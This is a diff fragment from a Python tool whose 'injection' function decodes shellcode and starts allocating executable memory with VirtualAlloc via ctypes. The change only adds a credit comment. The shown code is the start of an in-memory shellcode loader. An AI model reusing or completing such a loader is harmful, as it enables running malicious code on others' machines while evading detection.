@@ -22,6 +22,9 @@ import threading
 def injection(sc):
     sc = sc.decode("string_escape")
     sc = bytearray(sc)
+    # Initial awesome code and credit found here:
+    # http://www.debasish.in/2012_04_01_archive.html 
+
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                               ctypes.c_int(len(sc)),
                                               ctypes.c_int(0x3000),
